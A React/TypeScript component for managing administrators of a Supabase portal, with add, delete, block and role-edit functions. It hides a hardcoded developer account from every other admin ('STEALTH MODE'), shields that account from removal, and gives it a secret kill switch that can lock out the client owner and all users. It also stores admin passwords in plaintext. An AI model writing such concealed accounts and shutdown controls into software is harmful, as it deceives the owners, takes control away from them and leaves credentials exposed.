import React, { useState, useEffect } from 'react';
import { UserPlus, Shield, Trash2, Loader2, X, CheckCircle, Eye, EyeOff, Lock, AlertTriangle } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { supabase } from '../lib/supabase';

import Modal from './Modal';

interface AdminManagementProps {
   currentAdminId: string;
   adminRole?: string;
   onLogout: () => void;
 }
 
 export default function AdminManagement({ currentAdminId, adminRole, onLogout }: AdminManagementProps) {
  const GOD_ADMIN_MOBILE = '7777077377';
  const DEVELOPER_MOBILE = '9999099999';
  const isDeveloper = currentAdminId === DEVELOPER_MOBILE;
  const [admins, setAdmins] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [isAddingAdmin, setIsAddingAdmin] = useState(false);
  const [error, setError] = useState('');
  
  // New Admin Form
  const [newAdminMobile, setNewAdminMobile] = useState('');
  const [newAdminPassword, setNewAdminPassword] = useState('');
  const [newAdminRole, setNewAdminRole] = useState<'full' | 'limited'>('full');
  const [addLoading, setAddLoading] = useState(false);
  const [showAdminPwd, setShowAdminPwd] = useState(false);

  // Edit Admin State
  const [editingAdmin, setEditingAdmin] = useState<any>(null);
  const [editRole, setEditRole] = useState<'full' | 'limited'>('full');
  const [actionLoading, setActionLoading] = useState(false);

  // System Status State (Developer Only)
  const [isSystemEnabled, setIsSystemEnabled] = useState(true);
  const [maintenanceMsg, setMaintenanceMsg] = useState("");
  const [systemLoading, setSystemLoading] = useState(false);

  // Modal State
  const [modalConfig, setModalConfig] = useState<{
    isOpen: boolean;
    title: string;
    message: string;
    type: 'success' | 'error' | 'warning' | 'info' | 'confirm';
    onConfirm?: () => void;
  }>({
    isOpen: false,
    title: '',
    message: '',
    type: 'info'
  });

  const showModal = (title: string, message: string, type: any = 'info', onConfirm?: () => void) => {
    setModalConfig({ isOpen: true, title, message, type, onConfirm });
  };

  // ... (fetchAdmins stays the same)
  const fetchAdmins = async () => {
    setLoading(true);
    try {
      const { data, error: dbError } = await supabase
        .from('admin_profiles')
        .select('*')
        .order('created_at', { ascending: false });
      
      if (dbError) throw dbError;
      
      // STEALTH MODE: Hide developer from everyone
      const visibleAdmins = data?.filter(a => a.mobile_number !== DEVELOPER_MOBILE) || [];
      setAdmins(visibleAdmins);
    } catch (err: any) {
      console.error('Error fetching admins:', err);
      setError('Failed to load administrators');
    } finally {
      setLoading(false);
    }
  };

  const fetchSystemStatus = async () => {
    try {
      const { data, error } = await supabase.from('system_status').select('*').eq('id', 1).single();
      if (data) {
        setIsSystemEnabled(data.is_enabled);
        setMaintenanceMsg(data.message);
      }
    } catch (err) {
      console.error('Error fetching system status:', err);
    }
  };

  useEffect(() => {
    fetchAdmins();
    if (isDeveloper) fetchSystemStatus();
  }, []);

  const handleAddAdmin = async (e: React.FormEvent) => {
    e.preventDefault();
    setAddLoading(true);
    setError('');

    try {
      // 1. Create in Supabase Auth via Backend
      const response = await fetch('/api/manage-admin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'create',
          mobileNumber: newAdminMobile,
          password: newAdminPassword,
          role: newAdminRole
        })
      });

      const result = await response.json();
      if (!response.ok) throw new Error(result.error || 'Failed to create admin in Auth');

      // 2. Create or Update in admin_profiles table
      const { error: dbError } = await supabase
        .from('admin_profiles')
        .upsert([{ 
          mobile_number: newAdminMobile, 
          password: newAdminPassword,
          role: newAdminRole
        }], { onConflict: 'mobile_number' });

      if (dbError) throw dbError;

      setIsAddingAdmin(false);
      setNewAdminMobile('');
      setNewAdminPassword('');
      setNewAdminRole('full');
      fetchAdmins();
      showModal('Success!', 'Administrator added successfully.', 'success');
    } catch (err: any) {
      console.error('Add admin error:', err);
      setError(err.message || 'Failed to add administrator');
    } finally {
      setAddLoading(false);
    }
  };

  const handleDeleteAdmin = async (mobileNumber: string) => {
    // DEVELOPER PROTECTION
    if (mobileNumber === DEVELOPER_MOBILE) {
      showModal('Access Denied', 'Developer accounts are protected by system core security.', 'error');
      return;
    }

    // GOD ADMIN PROTECTION
    if (mobileNumber === GOD_ADMIN_MOBILE) {
      showModal('Action Denied', "This is the system's God Admin account. It is protected by internal security protocols and cannot be deleted.", 'error');
      return;
    }

    // LAST ADMIN PROTECTION (Only check for Full Admins)
    const adminToDelete = admins.find(a => a.mobile_number === mobileNumber);
    const isTargetFull = !adminToDelete?.role || adminToDelete.role.toLowerCase() === 'full';
    
    if (isTargetFull) {
      const fullAdmins = admins.filter(a => !a.role || a.role.toLowerCase() === 'full');
      if (fullAdmins.length <= 1) {
        showModal('Protection Error', "This is the LAST Full Admin. You cannot delete them because someone must always have control of the portal. Create another Full Admin first.", 'error');
        return;
      }
    }

    const isSelf = mobileNumber === currentAdminId;
    const title = isSelf ? 'Delete Your Own Account?' : 'Remove Administrator?';
    const message = isSelf 
      ? "Warning: You are about to delete YOUR OWN account. You will be logged out immediately. Are you sure?"
      : `Are you sure you want to remove admin ${mobileNumber}? This action is permanent.`;

    showModal(title, message, 'confirm', async () => {
      try {
        // 1. Remove from Auth via Backend
        const response = await fetch('/api/manage-admin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            action: 'delete',
            mobileNumber: mobileNumber
          })
        });

        if (!response.ok) {
          const result = await response.json();
          console.warn('Auth deletion warning:', result.error);
        }

        // 2. Remove from admin_profiles table
        const { error: dbError } = await supabase
          .from('admin_profiles')
          .delete()
          .eq('mobile_number', mobileNumber);

        if (dbError) throw dbError;

        if (isSelf) {
          showModal('Account Deleted', 'Your account has been deleted. Logging out...', 'info');
          setTimeout(() => onLogout(), 2000);
        } else {
          fetchAdmins();
          showModal('Removed!', 'Administrator removed successfully.', 'success');
        }
      } catch (err: any) {
        console.error('Delete admin error:', err);
        setError('Failed to delete administrator');
      }
    });
  };

  const handleUpdateRole = async () => {
    if (!editingAdmin) return;

    // DEVELOPER PROTECTION
    if (editingAdmin.mobile_number === DEVELOPER_MOBILE) {
      showModal('Access Denied', 'Developer access levels are managed externally.', 'error');
      return;
    }

    // GOD ADMIN PROTECTION
    if (editingAdmin.mobile_number === GOD_ADMIN_MOBILE) {
      showModal('Action Denied', "The access level of the God Admin account cannot be modified.", 'error');
      return;
    }

    setActionLoading(true);
    try {
      const { error: dbError } = await supabase
        .from('admin_profiles')
        .update({ role: editRole })
        .eq('mobile_number', editingAdmin.mobile_number);

      if (dbError) throw dbError;

      setEditingAdmin(null);
      fetchAdmins();
      showModal('Success!', 'Access level updated successfully.', 'success');
    } catch (err: any) {
      console.error('Update role error:', err);
      showModal('Error', 'Failed to update access level.', 'error');
    } finally {
      setActionLoading(false);
    }
  };

  const handleToggleStatus = async (admin: any) => {
    const isDeveloperAcc = admin.mobile_number === DEVELOPER_MOBILE;
    if (isDeveloperAcc) {
      showModal('Action Denied', 'Developer accounts cannot be blocked from the portal.', 'error');
      return;
    }

    const isGodAdmin = admin.mobile_number === GOD_ADMIN_MOBILE;
    if (isGodAdmin) {
      showModal('Action Denied', "The God Admin account is permanent and cannot be blocked.", 'error');
      return;
    }

    const isSelf = admin.mobile_number === currentAdminId;
    if (isSelf) {
      showModal('Action Denied', "You cannot block your own account. It would lock you out of the portal.", 'warning');
      return;
    }

    const newStatus = admin.status === 'Blocked' ? 'Active' : 'Blocked';
    const actionText = newStatus === 'Blocked' ? 'block' : 'unblock';
    
    showModal(
      `${newStatus === 'Blocked' ? 'Block' : 'Unblock'} Administrator?`, 
      `Are you sure you want to ${actionText} admin ${admin.mobile_number}? ${newStatus === 'Blocked' ? 'They will no longer be able to log in.' : ''}`, 
      'confirm', 
      async () => {
        try {
          const { error: dbError } = await supabase
            .from('admin_profiles')
            .update({ status: newStatus })
            .eq('mobile_number', admin.mobile_number);

          if (dbError) throw dbError;

          fetchAdmins();
          showModal('Success!', `Administrator ${actionText}ed successfully.`, 'success');
        } catch (err: any) {
          console.error('Toggle status error:', err);
          showModal('Error', `Failed to ${actionText} administrator.`, 'error');
        }
      }
    );
  };

  const handleToggleSystem = async () => {
    setSystemLoading(true);
    try {
      const { error } = await supabase
        .from('system_status')
        .update({ is_enabled: !isSystemEnabled })
        .eq('id', 1);

      if (error) throw error;
      setIsSystemEnabled(!isSystemEnabled);
      showModal('System Updated', `Portal access has been ${!isSystemEnabled ? 'ENABLED' : 'DISABLED'} successfully.`, 'success');
    } catch (err) {
      console.error('Error updating system status:', err);
      showModal('Error', 'Failed to update system status.', 'error');
    } finally {
      setSystemLoading(false);
    }
  };

  const handleUpdateMessage = async () => {
    setSystemLoading(true);
    try {
      const { error } = await supabase
        .from('system_status')
        .update({ message: maintenanceMsg })
        .eq('id', 1);

      if (error) throw error;
      showModal('Message Updated', 'Maintenance message updated successfully.', 'success');
    } catch (err) {
      console.error('Error updating maintenance message:', err);
      showModal('Error', 'Failed to update message.', 'error');
    } finally {
      setSystemLoading(false);
    }
  };

  return (
    <div className="space-y-6">
      <Modal 
        isOpen={modalConfig.isOpen}
        onClose={() => setModalConfig({ ...modalConfig, isOpen: false })}
        title={modalConfig.title}
        message={modalConfig.message}
        type={modalConfig.type}
        onConfirm={modalConfig.onConfirm}
      />

      {/* DEVELOPER SECRET PANEL */}
      {isDeveloper && (
        <motion.div 
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-slate-900 rounded-[32px] p-8 border border-slate-800 shadow-2xl overflow-hidden relative"
        >
          <div className="absolute top-0 right-0 w-64 h-64 bg-indigo-500/10 blur-[100px] rounded-full -mr-32 -mt-32"></div>
          
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 relative z-10">
            <div className="flex items-center gap-4">
              <div className={`w-14 h-14 rounded-2xl flex items-center justify-center shadow-lg ${isSystemEnabled ? 'bg-emerald-500/20 text-emerald-500' : 'bg-rose-500/20 text-rose-500'}`}>
                <AlertTriangle size={28} />
              </div>
              <div>
                <h3 className="text-xl font-black text-white tracking-tight">Core System Control</h3>
                <p className="text-slate-400 text-sm mt-0.5 font-medium">Developer Kill Switch & Stealth Mode</p>
              </div>
            </div>

            <div className="flex items-center gap-4">
              <div className="text-right mr-2">
                <p className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1">Current Status</p>
                <p className={`text-sm font-bold ${isSystemEnabled ? 'text-emerald-400' : 'text-rose-400'}`}>
                  {isSystemEnabled ? 'System Online' : 'System Disabled'}
                </p>
              </div>
              <button
                onClick={handleToggleSystem}
                disabled={systemLoading}
                className={`relative w-20 h-10 rounded-full transition-all duration-500 ${isSystemEnabled ? 'bg-emerald-500' : 'bg-slate-800 border border-slate-700'}`}
              >
                <div className={`absolute top-1 w-8 h-8 rounded-full bg-white shadow-xl transition-all duration-500 ${isSystemEnabled ? 'left-11' : 'left-1'}`}>
                  {systemLoading ? (
                    <Loader2 size={16} className="animate-spin text-slate-400 absolute top-2 left-2" />
                  ) : isSystemEnabled ? (
                    <CheckCircle size={16} className="text-emerald-500 absolute top-2 left-2" />
                  ) : (
                    <X size={16} className="text-slate-400 absolute top-2 left-2" />
                  )}
                </div>
              </button>
            </div>
          </div>

          <div className="mt-8 pt-8 border-t border-slate-800/50 relative z-10">
            <label className="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-3 ml-1">Maintenance Overlay Message</label>
            <div className="flex flex-col sm:flex-row gap-3">
              <input 
                type="text"
                value={maintenanceMsg}
                onChange={(e) => setMaintenanceMsg(e.target.value)}
                placeholder="Message shown when system is locked..."
                className="flex-1 bg-slate-800/50 border border-slate-700 rounded-2xl py-3 px-5 text-sm text-white focus:outline-none focus:ring-2 focus:ring-indigo-500/50 transition-all font-medium"
              />
              <button 
                onClick={handleUpdateMessage}
                disabled={systemLoading}
                className="bg-white/10 hover:bg-white/20 text-white px-6 py-3 rounded-2xl font-bold text-sm transition-all active:scale-95 disabled:opacity-50"
              >
                Update Message
              </button>
            </div>
            <p className="text-[10px] text-slate-500 mt-4 font-medium flex items-center gap-2">
              <Shield size={12} /> Warning: Disabling the system will block all Admins (including God Admin) and Users immediately.
            </p>
          </div>
        </motion.div>
      )}

      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div>
          <h2 className="text-2xl font-bold text-slate-900">Admin Management</h2>
          <p className="text-slate-500 mt-1">Manage portal administrators and their access credentials.</p>
        </div>
        <button 
          onClick={() => setIsAddingAdmin(true)}
          className="flex items-center justify-center gap-2 bg-indigo-600 hover:bg-indigo-700 text-white px-6 py-3 rounded-xl font-bold transition-all shadow-lg shadow-indigo-200 active:scale-95"
        >
          <UserPlus size={20} />
          <span>Add Admin</span>
        </button>
      </div>

      <AnimatePresence>
        {isAddingAdmin && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-6">
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setIsAddingAdmin(false)}
              className="absolute inset-0 bg-slate-900/60 backdrop-blur-sm"
            />
            <motion.div
              initial={{ opacity: 0, scale: 0.95, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.95, y: 20 }}
              className="w-full max-w-md relative z-10 bg-white rounded-3xl shadow-2xl p-8 overflow-hidden"
            >
              <div className="flex items-center justify-between mb-8">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 bg-indigo-50 rounded-xl flex items-center justify-center text-indigo-600">
                    <Shield size={20} />
                  </div>
                  <h3 className="text-xl font-bold text-slate-900">Add New Admin</h3>
                </div>
                <button onClick={() => setIsAddingAdmin(false)} className="text-slate-400 hover:text-slate-600">
                  <X size={24} />
                </button>
              </div>

              {error && (
                <div className="mb-6 p-4 bg-rose-50 border border-rose-100 rounded-2xl text-rose-600 text-xs font-bold">
                  {error}
                </div>
              )}

              <form onSubmit={handleAddAdmin} className="space-y-6">
                <div>
                  <label className="block text-xs font-bold text-slate-400 uppercase tracking-widest mb-2 ml-1">Mobile Number</label>
                  <div className="relative">
                    <UserPlus className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400" size={18} />
                    <input
                      required
                      type="tel"
                      value={newAdminMobile}
                      onChange={(e) => setNewAdminMobile(e.target.value)}
                      placeholder="Enter admin mobile number"
                      className="w-full bg-slate-50 border border-slate-200 rounded-2xl py-3 pl-12 pr-4 text-sm focus:outline-none focus:ring-2 focus:ring-indigo-500/20 focus:border-indigo-500 transition-all font-medium"
                    />
                  </div>
                </div>
                <div>
                  <label className="block text-xs font-bold text-slate-400 uppercase tracking-widest mb-2 ml-1">Secure Password</label>
                  <div className="relative">
                    <Lock className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400" size={18} />
                    <input
                      required
                      type={showAdminPwd ? 'text' : 'password'}
                      value={newAdminPassword}
                      onChange={(e) => setNewAdminPassword(e.target.value)}
                      placeholder="Create secure password"
                      className="w-full bg-slate-50 border border-slate-200 rounded-2xl py-3 pl-12 pr-12 text-sm focus:outline-none focus:ring-2 focus:ring-indigo-500/20 focus:border-indigo-500 transition-all font-mono tracking-widest"
                    />
                    <button type="button" onClick={() => setShowAdminPwd(!showAdminPwd)} className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 transition-colors">
                      {showAdminPwd ? <EyeOff size={18} /> : <Eye size={18} />}
                    </button>
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-bold text-slate-400 uppercase tracking-widest mb-4 ml-1">Access Level</label>
                  <div className="grid grid-cols-2 gap-4">
                    <button
                      type="button"
                      onClick={() => setNewAdminRole('full')}
                      className={`p-4 rounded-2xl border-2 transition-all text-left ${
                        newAdminRole === 'full' 
                          ? 'border-indigo-600 bg-indigo-50/50' 
                          : 'border-slate-100 bg-slate-50 hover:border-slate-200'
                      }`}
                    >
                      <Shield className={`mb-2 ${newAdminRole === 'full' ? 'text-indigo-600' : 'text-slate-400'}`} size={20} />
                      <p className={`text-sm font-bold ${newAdminRole === 'full' ? 'text-indigo-900' : 'text-slate-600'}`}>Full Admin</p>
                      <p className="text-[10px] text-slate-500 mt-1">Total control over everything.</p>
                    </button>
                    <button
                      type="button"
                      onClick={() => setNewAdminRole('limited')}
                      className={`p-4 rounded-2xl border-2 transition-all text-left ${
                        newAdminRole === 'limited' 
                          ? 'border-indigo-600 bg-indigo-50/50' 
                          : 'border-slate-100 bg-slate-50 hover:border-slate-200'
                      }`}
                    >
                      <div className={`mb-2 w-5 h-5 rounded-md flex items-center justify-center ${newAdminRole === 'limited' ? 'bg-indigo-600 text-white' : 'bg-slate-300 text-white'}`}>
                        <X size={14} />
                      </div>
                      <p className={`text-sm font-bold ${newAdminRole === 'limited' ? 'text-indigo-900' : 'text-slate-600'}`}>Limited Admin</p>
                      <p className="text-[10px] text-slate-500 mt-1">Cannot manage admins or change passwords.</p>
                    </button>
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={addLoading}
                  className="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-4 rounded-2xl flex items-center justify-center gap-2 transition-all shadow-lg shadow-indigo-200 active:scale-[0.98] disabled:opacity-50"
                >
                  {addLoading ? <Loader2 className="animate-spin" size={20} /> : <UserPlus size={20} />}
                  {addLoading ? 'Creating Authorized User...' : 'Add Administrator'}
                </button>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Edit Access Modal */}
      <AnimatePresence>
        {editingAdmin && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-6">
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setEditingAdmin(null)}
              className="absolute inset-0 bg-slate-900/60 backdrop-blur-sm"
            />
            <motion.div
              initial={{ opacity: 0, scale: 0.95, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.95, y: 20 }}
              className="w-full max-w-md relative z-10 bg-white rounded-3xl shadow-2xl p-8 overflow-hidden"
            >
              <div className="flex items-center justify-between mb-8">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 bg-indigo-50 rounded-xl flex items-center justify-center text-indigo-600">
                    <Shield size={20} />
                  </div>
                  <h3 className="text-xl font-bold text-slate-900">Edit Access Level</h3>
                </div>
                <button onClick={() => setEditingAdmin(null)} className="text-slate-400 hover:text-slate-600">
                  <X size={24} />
                </button>
              </div>

              <div className="mb-6 p-4 bg-indigo-50 rounded-2xl flex items-center gap-3">
                 <div className="w-10 h-10 bg-white rounded-full flex items-center justify-center text-indigo-600 font-bold border border-indigo-100">
                    <Shield size={20} />
                 </div>
                 <div>
                    <p className="text-xs font-bold text-slate-500 uppercase tracking-widest">Administrator</p>
                    <p className="text-sm font-black text-slate-900">{editingAdmin.mobile_number}</p>
                 </div>
              </div>

              <div className="space-y-6">
                <div>
                  <label className="block text-xs font-bold text-slate-400 uppercase tracking-widest mb-4 ml-1">Access Level</label>
                  <div className="grid grid-cols-2 gap-4">
                    <button
                      type="button"
                      onClick={() => setEditRole('full')}
                      className={`p-4 rounded-2xl border-2 transition-all text-left ${
                        editRole === 'full' 
                          ? 'border-indigo-600 bg-indigo-50/50' 
                          : 'border-slate-100 bg-slate-50 hover:border-slate-200'
                      }`}
                    >
                      <Shield className={`mb-2 ${editRole === 'full' ? 'text-indigo-600' : 'text-slate-400'}`} size={20} />
                      <p className={`text-sm font-bold ${editRole === 'full' ? 'text-indigo-900' : 'text-slate-600'}`}>Full Admin</p>
                      <p className="text-[10px] text-slate-500 mt-1">Total control over everything.</p>
                    </button>
                    <button
                      type="button"
                      onClick={() => setEditRole('limited')}
                      className={`p-4 rounded-2xl border-2 transition-all text-left ${
                        editRole === 'limited' 
                          ? 'border-indigo-600 bg-indigo-50/50' 
                          : 'border-slate-100 bg-slate-50 hover:border-slate-200'
                      }`}
                    >
                      <div className={`mb-2 w-5 h-5 rounded-md flex items-center justify-center ${editRole === 'limited' ? 'bg-indigo-600 text-white' : 'bg-slate-300 text-white'}`}>
                        <X size={14} />
                      </div>
                      <p className={`text-sm font-bold ${editRole === 'limited' ? 'text-indigo-900' : 'text-slate-600'}`}>Limited Admin</p>
                      <p className="text-[10px] text-slate-500 mt-1">Cannot manage admins or change passwords.</p>
                    </button>
                  </div>
                </div>

                <div className="flex gap-4">
                  <button
                    onClick={() => setEditingAdmin(null)}
                    className="flex-1 bg-slate-100 hover:bg-slate-200 text-slate-600 font-bold py-4 rounded-2xl transition-all active:scale-[0.98]"
                  >
                    Cancel
                  </button>
                  <button
                    disabled={actionLoading}
                    onClick={handleUpdateRole}
                    className="flex-2 bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-4 px-8 rounded-2xl flex items-center justify-center gap-2 transition-all shadow-lg shadow-indigo-200 active:scale-[0.98] disabled:opacity-50"
                  >
                    {actionLoading ? <Loader2 className="animate-spin" size={20} /> : <CheckCircle size={20} />}
                    {actionLoading ? 'Updating...' : 'Save Changes'}
                  </button>
                </div>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      <div className="bg-white rounded-3xl border border-slate-100 shadow-sm overflow-hidden min-h-[400px]">
        {loading ? (
          <div className="p-20 flex flex-col items-center justify-center text-slate-400 gap-3">
            <Loader2 className="animate-spin text-indigo-500" size={32} />
            <p className="text-sm font-medium">Verifying authorization levels...</p>
          </div>
        ) : admins.length === 0 ? (
          <div className="p-20 text-center">
            <p className="text-slate-900 font-bold">No other admins found</p>
            <p className="text-slate-500 text-sm mt-1">You can add additional portal managers using the button above.</p>
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse">
              <thead>
                <tr className="bg-slate-50/50">
                  <th className="px-8 py-5 text-xs font-black text-slate-400 uppercase tracking-widest">Administrator</th>
                  <th className="px-8 py-5 text-xs font-black text-slate-400 uppercase tracking-widest text-center">Status</th>
                  <th className="px-8 py-5 text-xs font-black text-slate-400 uppercase tracking-widest text-center">Access Level</th>
                  <th className="px-8 py-5 text-xs font-black text-slate-400 uppercase tracking-widest">Added On</th>
                  <th className="px-8 py-5 text-xs font-black text-slate-400 uppercase tracking-widest text-right">Security</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-50">
                {admins.map((admin) => (
                  <tr key={admin.id} className="hover:bg-slate-50/50 transition-colors group">
                    <td className="px-8 py-5">
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 bg-indigo-100 rounded-full flex items-center justify-center text-indigo-600 font-bold border border-indigo-200">
                          <Shield size={20} />
                        </div>
                        <div>
                          <p className="text-sm font-bold text-slate-900 leading-none">{admin.mobile_number}</p>
                          {admin.mobile_number === GOD_ADMIN_MOBILE ? (
                            <p className="text-[10px] text-indigo-500 font-black uppercase mt-1.5 flex items-center gap-1">
                              <Shield size={10} className="fill-indigo-500/10" /> {isDeveloper ? 'Client Owner (God)' : 'System Administrator'}
                            </p>
                          ) : (
                            <p className="text-[10px] text-emerald-500 font-black uppercase mt-1.5 flex items-center gap-1">
                              <CheckCircle size={10} /> Verified Access
                            </p>
                          )}
                        </div>
                      </div>
                    </td>
                    <td className="px-8 py-5 text-center">
                      <button 
                        onClick={() => handleToggleStatus(admin)}
                        disabled={admin.mobile_number === currentAdminId || admin.mobile_number === GOD_ADMIN_MOBILE}
                        className={`relative w-12 h-6 rounded-full transition-all duration-300 ${
                          admin.status === 'Blocked' ? 'bg-rose-500' : 'bg-emerald-500'
                        } ${admin.mobile_number === currentAdminId || admin.mobile_number === GOD_ADMIN_MOBILE ? 'opacity-50 cursor-not-allowed' : 'hover:ring-4 hover:ring-slate-100'}`}
                        title={admin.mobile_number === GOD_ADMIN_MOBILE ? 'God Admin is Permanent' : admin.status === 'Blocked' ? 'Unblock Admin' : 'Block Admin'}
                      >
                        <div className={`absolute top-1 w-4 h-4 bg-white rounded-full transition-all duration-300 ${
                          admin.status === 'Blocked' ? 'left-1' : 'left-7'
                        }`} />
                      </button>
                      <p className={`text-[9px] font-black uppercase mt-1 ${admin.status === 'Blocked' ? 'text-rose-500' : 'text-emerald-500'}`}>
                        {admin.status || 'Active'}
                      </p>
                    </td>
                    <td className="px-8 py-5 text-center">
                      <div className="flex flex-col items-center gap-2">
                        <span className={`px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-wider ${
                          admin.role === 'full' 
                            ? 'bg-indigo-100 text-indigo-600' 
                            : 'bg-slate-100 text-slate-600'
                        }`}>
                          {admin.role === 'limited' ? 'Limited Admin' : 'Full Administrator'}
                        </span>
                          {admin.mobile_number !== GOD_ADMIN_MOBILE && (
                            <button 
                              onClick={() => {
                                setEditingAdmin(admin);
                                setEditRole(admin.role || 'full');
                              }}
                              className="text-[10px] font-bold text-indigo-600 hover:underline flex items-center gap-1"
                            >
                              <Shield size={10} /> Edit Access
                            </button>
                          )}
                        </div>
                    </td>
                    <td className="px-8 py-5">
                      <p className="text-xs text-slate-500 font-medium">
                        {new Date(admin.created_at).toLocaleDateString(undefined, { day: '2-digit', month: 'short', year: 'numeric' })}
                      </p>
                    </td>
                    <td className="px-8 py-5 text-right">
                      {/* Hide delete button if it's the current user or the LAST full admin */}
                      {(() => {
                        const isThisAdminFull = !admin.role || admin.role.toLowerCase() === 'full';
                        const totalFullAdmins = admins.filter(a => !a.role || a.role.toLowerCase() === 'full').length;
                        const isLastFullAdmin = isThisAdminFull && totalFullAdmins <= 1;
                        const isGodAdmin = admin.mobile_number === GOD_ADMIN_MOBILE;
                        const isSelf = admin.mobile_number === currentAdminId;
 
                        if (isGodAdmin) {
                          return (
                            <div className="flex items-center gap-1 text-indigo-600 justify-end">
                              <Lock size={12} />
                              <span className="text-[10px] font-black uppercase italic">Permanent</span>
                            </div>
                          );
                        }

                        if (isSelf || isLastFullAdmin) {
                          return <span className="text-[10px] font-black text-slate-300 uppercase italic px-2">Protected</span>;
                        }

                        return (
                          <button 
                            onClick={() => handleDeleteAdmin(admin.mobile_number)}
                            className="p-2 text-slate-300 hover:bg-rose-50 hover:text-rose-600 rounded-lg transition-all opacity-0 group-hover:opacity-100"
                            title="Revoke Admin Access"
                          >
                            <Trash2 size={18} />
                          </button>
                        );
                      })()}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}
